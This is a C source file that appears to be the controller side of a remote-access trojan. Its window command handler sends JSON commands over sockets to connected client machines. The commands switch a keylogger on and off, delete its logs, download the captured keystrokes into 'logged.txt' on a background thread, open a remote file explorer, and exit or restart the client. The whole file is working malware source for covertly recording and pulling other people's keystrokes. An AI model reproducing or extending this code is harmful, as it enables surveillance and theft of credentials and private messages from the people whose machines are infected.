#include <server/server_listview.h>
#include <server/server_logic.h>
#include <server/server_manager.h>
#include <gui/command_handler.h>
#include <globals.h>
#include <resource.h>
#include <commctrl.h>

#include <gui/log_page.h>
#include <gui/log_handler.h>
#include <gui/network_settings_window.h>
#include <gui/tools_window.h>
#include <gui/about_window.h>
#include <gui/main_controls.h>
#include <gui/tooltip.h>

#include <stdio.h>

#include <gui/file_explorer/fe_main_window.h>
#include <cJSON/cJSON.h>
#include <service/network_service.h>
#include <gui/log_page.h>

// Data structure to pass information to the download worker thread
typedef struct
{
    SOCKET clientSocket;
    LPCRITICAL_SECTION pSocketLock;
} KeylogDownloadThreadData;

static const char *GetJsonStringe(cJSON *obj, const char *key)
{
    cJSON *item = cJSON_GetObjectItemCaseSensitive(obj, key);
    return (cJSON_IsString(item) && item->valuestring) ? item->valuestring : "N/A";
}

// Worker thread to handle the keylog download asynchronously
DWORD WINAPI KeylogDownloadThread(LPVOID lpParameter)
{
    KeylogDownloadThreadData *data = (KeylogDownloadThreadData *)lpParameter;
    if (!data)
    {
        return 1;
    }

    // 1. Create and send the download request
    cJSON *cmd = cJSON_CreateObject();
    cJSON_AddStringToObject(cmd, "command", "KEYLOGGER");
    cJSON_AddStringToObject(cmd, "action", "download");

    EnterCriticalSection(data->pSocketLock);
    BOOL requestSent = SendJsonRequest(data->clientSocket, cmd);
    LeaveCriticalSection(data->pSocketLock);

    cJSON_Delete(cmd);

    if (!requestSent)
    {
        PostLogMessage(L"Failed to send log download request.");
        free(data);
        return 1;
    }

    PostLogMessage(L"Download request sent for logged.txt. Waiting for response...");

    // 2. Receive the response from the client
    PacketType responseType;
    cJSON *responseJson = NULL;
    char *fileData = NULL;
    uint32_t fileSize = 0;

    EnterCriticalSection(data->pSocketLock);
    BOOL received = ReceiveRequest(data->clientSocket, &responseType, &responseJson, &fileData, &fileSize, NULL, NULL);
    LeaveCriticalSection(data->pSocketLock);

    // 3. Process the response and write the file
    if (received)
    {
        if (responseJson)
        {
            cJSON *status = cJSON_GetObjectItem(responseJson, "status");
            if (cJSON_IsString(status) && strcmp(status->valuestring, "success") == 0)
            {
                FILE *outFile;
                if (_wfopen_s(&outFile, L"logged.txt", L"wb") == 0 && outFile)
                {
                    if (fileSize > 0 && fileData != NULL)
                    {
                        if (fwrite(fileData, 1, fileSize, outFile) == fileSize)
                        {
                            PostLogMessage(L"Successfully downloaded logged.txt (%u bytes).", fileSize);
                        }
                        else
                        {
                            PostLogMessage(L"Error writing to local file 'logged.txt'.");
                        }
                    }
                    else
                    {
                        PostLogMessage(L"Successfully downloaded empty log file (logged.txt).");
                    }
                    fclose(outFile);
                }
                else
                {
                    PostLogMessage(L"Failed to open 'logged.txt' for writing. Error: %d", GetLastError());
                }
            }
            else
            {
                PostLogMessage(L"Client reported download failed for logged.txt. Status: %hs. Message: %hs",
                               GetJsonStringe(responseJson, "status"), GetJsonStringe(responseJson, "message"));
            }
        }
        else
        {
            PostLogMessage(L"Received invalid or non-JSON response from client for log download.");
        }
    }
    else
    {
        PostLogMessage(L"Failed to receive response from client for log download. Error: %d", WSAGetLastError());
    }

    // 4. Clean up resources
    if (responseJson)
        cJSON_Delete(responseJson);
    if (fileData)
        free(fileData);
    free(data);

    return 0;
}

void HandleMainWindowCommands(HWND hwnd, WPARAM wParam, LPARAM lParam)
{
    switch (LOWORD(wParam))
    {
    case IDC_LOG_CLEAR_BUTTON:
    {
        if (g_log_controls.hwndListLog)
        {
            ListView_DeleteAllItems(g_log_controls.hwndListLog);
            WCHAR logMsg[128];
            LoadStringW(g_hinst, IDS_LOG_LOG_CLEARED, logMsg, _countof(logMsg));
            AddLogMessage(logMsg);
        }
        break;
    }
    case IDC_LOG_AUTOSCROLL_CHECKBOX:
    {
        g_bLogAutoScroll = IsDlgButtonChecked(hwnd, IDC_LOG_AUTOSCROLL_CHECKBOX);
        WCHAR logMsg[128];
        UINT resId = g_bLogAutoScroll ? IDS_LOG_AUTOSCROLL_ON : IDS_LOG_AUTOSCROLL_OFF;
        LoadStringW(g_hinst, resId, logMsg, _countof(logMsg));
        AddLogMessage(logMsg);
        break;
    }
    case IDC_LOG_SAVE_BUTTON:
    {
        SaveLogToFile(g_log_controls.hwndListLog);
        break;
    }
    case IDC_LOG_COPY_BUTTON:
    {
        HWND hList = g_log_controls.hwndListLog;
        if (hList)
        {
            CopyLogToClipboard(hList);
            int itemCount = ListView_GetItemCount(hList);
            for (int i = 0; i < itemCount; ++i)
            {
                ListView_SetItemState(hList, i, LVIS_SELECTED, LVIS_SELECTED);
            }
            SetFocus(hList);
        }
        break;
    }
    case IDC_BTN_WORLD:
    {
        EnableWindow(hwnd, FALSE);
        CreateNetworkSettingsWindow(hwnd);
        break;
    }

    case IDC_BTN_TOOLS:
    {
        CreateToolsWindow(hwnd);
        break;
    }

    case IDC_BTN_INFO:
    {
        EnableWindow(hwnd, FALSE);
        CreateAboutWindow(hwnd);
        break;
    }

    case IDC_BTN_SETTINGS_ALT:
    {
        WCHAR logMsg[128];
        LoadStringW(g_hinst, IDS_LOG_SETTINGS_CLICKED, logMsg, _countof(logMsg));
        AddLogMessage(logMsg);
        break;
    }

    case IDC_BTN_LOGS:
    {
        SwitchTab(2);
        break;
    }

    case IDC_BTN_ADD_SERVER:
    {
        AddServerToList();
        break;
    }

    case IDM_SERVER_START:
    {
        if (g_serverContextMenuIndex != -1)
            StartServer(g_serverContextMenuIndex);
        break;
    }

    case IDM_SERVER_STOP:
    {
        if (g_serverContextMenuIndex != -1)
            StopServer(g_serverContextMenuIndex);
        break;
    }

    case IDM_SERVER_REMOVE:
    {
        ServerInfo serverCopy;
        BOOL removed = FALSE;

        EnterCriticalSection(&g_cs_servers);

        if (g_serverContextMenuIndex != -1 && g_serverContextMenuIndex < g_server_count)
        {
            serverCopy = g_servers[g_serverContextMenuIndex];

            if (serverCopy.status == SERVER_LISTENING)
            {
                int index_to_stop = g_serverContextMenuIndex;
                LeaveCriticalSection(&g_cs_servers);
                StopServer(index_to_stop);
                EnterCriticalSection(&g_cs_servers);
            }

            if (g_serverContextMenuIndex != -1 && g_serverContextMenuIndex < g_server_count)
            {
                ListView_DeleteItem(g_server_controls.hwndListServers, g_serverContextMenuIndex);

                for (int i = g_serverContextMenuIndex; i < g_server_count - 1; ++i)
                {
                    g_servers[i] = g_servers[i + 1];
                }
                g_server_count--;
                g_serverContextMenuIndex = -1;
                removed = TRUE;
            }
        }
        LeaveCriticalSection(&g_cs_servers);

        if (removed)
        {
            AddLogMessage(L"Removed server configuration for %s:%d.", serverCopy.ipAddress, serverCopy.port);
        }
        break;
    }
    case IDM_CLIENT_FILE_EXPLORER:
    {
        if (g_clientContextMenuIndex != -1)
        {

            LVITEMW lvi = {0};
            lvi.mask = LVIF_PARAM;
            lvi.iItem = g_clientContextMenuIndex;
            ListView_GetItem(g_client_controls.hwndListClients, &lvi);
            int actualClientIndex = (int)lvi.lParam;

            CreateFileExplorerWindow(hwnd, actualClientIndex);
            g_clientContextMenuIndex = -1;
        }
        break;
    }
    case IDM_CLIENT_EXIT:
    {
        if (g_clientContextMenuIndex != -1)
        {
            LVITEMW lvi = {0};
            lvi.mask = LVIF_PARAM;
            lvi.iItem = g_clientContextMenuIndex;
            ListView_GetItem(g_client_controls.hwndListClients, &lvi);
            int actualClientIndex = (int)lvi.lParam;

            SOCKET clientSocket = INVALID_SOCKET;
            LPCRITICAL_SECTION pSocketLock = NULL;
            char clientIp[16] = {0};

            EnterCriticalSection(&g_cs_clients);

            if (actualClientIndex >= 0 && actualClientIndex < MAX_CLIENTS && g_active_clients[actualClientIndex].isActive)
            {
                clientSocket = g_active_clients[actualClientIndex].socket;
                pSocketLock = &g_active_clients[actualClientIndex].cs_socket_access;
#ifndef __TINYC__
                strcpy_s(clientIp, sizeof(clientIp), g_active_clients[actualClientIndex].info.ipAddress);
#else
                snprintf(clientIp, sizeof(clientIp), "%s", g_active_clients[actualClientIndex].info.ipAddress);
#endif
            }
            LeaveCriticalSection(&g_cs_clients);

            if (clientSocket != INVALID_SOCKET && pSocketLock != NULL)
            {
                cJSON *cmd = cJSON_CreateObject();

                const char *commandStr = (LOWORD(wParam) == IDM_CLIENT_EXIT) ? "EXIT" : "restart";
                cJSON_AddStringToObject(cmd, "command", commandStr);

                EnterCriticalSection(pSocketLock);
                SendJsonRequest(clientSocket, cmd);
                LeaveCriticalSection(pSocketLock);

                cJSON_Delete(cmd);

                WCHAR logMsg[256], formatStr[256];

                UINT logId = (LOWORD(wParam) == IDM_CLIENT_EXIT) ? IDS_LOG_CLIENT_RESTART_CMD_SENT : IDS_LOG_CLIENT_RESTART_CMD_SENT;
                LoadStringW(g_hinst, logId, formatStr, _countof(formatStr));
                swprintf_s(logMsg, _countof(logMsg), formatStr, clientIp);
                AddLogMessage(logMsg);

                if (LOWORD(wParam) == IDM_CLIENT_EXIT || LOWORD(wParam) == IDM_CLIENT_DISCONNECT)
                {
                    closesocket(clientSocket);
                }
            }
            g_clientContextMenuIndex = -1;
        }
        break;
    }
    case IDM_CLIENT_DISCONNECT:
    {
        if (g_clientContextMenuIndex != -1)
        {
            SOCKET clientSocket = INVALID_SOCKET;
            char clientIp[16] = {0};

            EnterCriticalSection(&g_cs_clients);
            if (g_clientContextMenuIndex < g_active_client_count)
            {
                clientSocket = g_active_clients[g_clientContextMenuIndex].socket;
#ifndef __TINYC__
                strcpy_s(clientIp, sizeof(clientIp), g_active_clients[g_clientContextMenuIndex].info.ipAddress);
#else
                snprintf(clientIp, sizeof(clientIp), "%s", g_active_clients[g_clientContextMenuIndex].info.ipAddress);
#endif
            }
            LeaveCriticalSection(&g_cs_clients);

            if (clientSocket != INVALID_SOCKET)
            {
                closesocket(clientSocket);

                WCHAR logMsg[256], formatStr[256];
                LoadStringW(g_hinst, IDS_LOG_CLIENT_DISCONNECTED_BY_USER, formatStr, _countof(formatStr));
                swprintf_s(logMsg, _countof(logMsg), formatStr, clientIp);
                AddLogMessage(logMsg);
            }
            g_clientContextMenuIndex = -1;
        }
        break;
    }

    case IDM_CLIENT_RESTART:
    {
        if (g_clientContextMenuIndex != -1)
        {
            SOCKET clientSocket = INVALID_SOCKET;
            LPCRITICAL_SECTION pSocketLock = NULL;
            char clientIp[16] = {0};

            EnterCriticalSection(&g_cs_clients);
            if (g_clientContextMenuIndex < g_active_client_count)
            {
                clientSocket = g_active_clients[g_clientContextMenuIndex].socket;
                pSocketLock = &g_active_clients[g_clientContextMenuIndex].cs_socket_access;
#ifndef __TINYC__
                strcpy_s(clientIp, sizeof(clientIp),
                         g_active_clients[g_clientContextMenuIndex].info.ipAddress);
#else
                snprintf(clientIp, sizeof(clientIp), "%s",
                         g_active_clients[g_clientContextMenuIndex].info.ipAddress);
#endif
            }
            LeaveCriticalSection(&g_cs_clients);

            if (clientSocket != INVALID_SOCKET && pSocketLock != NULL)
            {
                cJSON *restartCmd = cJSON_CreateObject();
                cJSON_AddStringToObject(restartCmd, "command", "restart");

                EnterCriticalSection(pSocketLock);
                SendJsonRequest(clientSocket, restartCmd);
                LeaveCriticalSection(pSocketLock);

                cJSON_Delete(restartCmd);

                WCHAR logMsg[256], formatStr[256];
                LoadStringW(g_hinst, IDS_LOG_CLIENT_RESTART_CMD_SENT, formatStr, _countof(formatStr));
                swprintf_s(logMsg, _countof(logMsg), formatStr, clientIp);
                AddLogMessage(logMsg);
            }
            g_clientContextMenuIndex = -1;
        }
        break;
    }
    case IDM_CLIENT_KEYLOGGER_START:
    case IDM_CLIENT_KEYLOGGER_STOP:
    case IDM_CLIENT_KEYLOGGER_DELETE:
    case IDM_CLIENT_KEYLOGGER_DOWNLOAD:
    {
        if (g_clientContextMenuIndex != -1)
        {
            SOCKET clientSocket = INVALID_SOCKET;
            LPCRITICAL_SECTION pSocketLock = NULL;
            char clientIp[16] = {0};

            EnterCriticalSection(&g_cs_clients);
            if (g_clientContextMenuIndex < g_active_client_count)
            {
                clientSocket = g_active_clients[g_clientContextMenuIndex].socket;
                pSocketLock = &g_active_clients[g_clientContextMenuIndex].cs_socket_access;
#ifndef __TINYC__
                strcpy_s(clientIp, sizeof(clientIp), g_active_clients[g_clientContextMenuIndex].info.ipAddress);
#else
                snprintf(clientIp, sizeof(clientIp), "%s", g_active_clients[g_clientContextMenuIndex].info.ipAddress);
#endif
            }
            LeaveCriticalSection(&g_cs_clients);

            if (clientSocket != INVALID_SOCKET && pSocketLock != NULL)
            {
                UINT logId = 0;
                switch (LOWORD(wParam))
                {
                case IDM_CLIENT_KEYLOGGER_START:
                    logId = IDS_LOG_KEYLOGGER_STARTED;
                    break;
                case IDM_CLIENT_KEYLOGGER_STOP:
                    logId = IDS_LOG_KEYLOGGER_STOPPED;
                    break;
                case IDM_CLIENT_KEYLOGGER_DOWNLOAD:
                    logId = IDS_LOG_KEYLOGGER_DOWNLOADED;
                    break;
                case IDM_CLIENT_KEYLOGGER_DELETE:
                    logId = IDS_LOG_KEYLOGGER_DELETED;
                    break;
                }

                if (LOWORD(wParam) == IDM_CLIENT_KEYLOGGER_DOWNLOAD)
                {
                    KeylogDownloadThreadData *threadData = (KeylogDownloadThreadData *)malloc(sizeof(KeylogDownloadThreadData));
                    if (threadData)
                    {
                        threadData->clientSocket = clientSocket;
                        threadData->pSocketLock = pSocketLock;
                        HANDLE hThread = CreateThread(NULL, 0, KeylogDownloadThread, threadData, 0, NULL);
                        if (hThread)
                        {
                            CloseHandle(hThread); // The thread will free its own data and manage its lifecycle
                        }
                        else
                        {
                            free(threadData);
                            AddLogMessage(L"Failed to create keylog download thread.");
                        }
                    }
                }
                else
                {
                    // Handle other commands synchronously as they don't block for a response
                    cJSON *cmd = cJSON_CreateObject();
                    cJSON_AddStringToObject(cmd, "command", "KEYLOGGER");
                    const char *action = NULL;
                    if (LOWORD(wParam) == IDM_CLIENT_KEYLOGGER_START)
                        action = "on";
                    else if (LOWORD(wParam) == IDM_CLIENT_KEYLOGGER_STOP)
                        action = "off";
                    else if (LOWORD(wParam) == IDM_CLIENT_KEYLOGGER_DELETE)
                        action = "delete_logs";

                    if (action)
                    {
                        cJSON_AddStringToObject(cmd, "action", action);
                        EnterCriticalSection(pSocketLock);
                        SendJsonRequest(clientSocket, cmd);
                        LeaveCriticalSection(pSocketLock);
                    }
                    cJSON_Delete(cmd);
                }

                if (logId != 0)
                {
                    WCHAR logMsg[256], formatStr[256];
                    LoadStringW(g_hinst, logId, formatStr, _countof(formatStr));
                    swprintf_s(logMsg, _countof(logMsg), formatStr, clientIp);
                    AddLogMessage(logMsg);
                }
            }
            g_clientContextMenuIndex = -1;
        }
        break;
    }
    }
}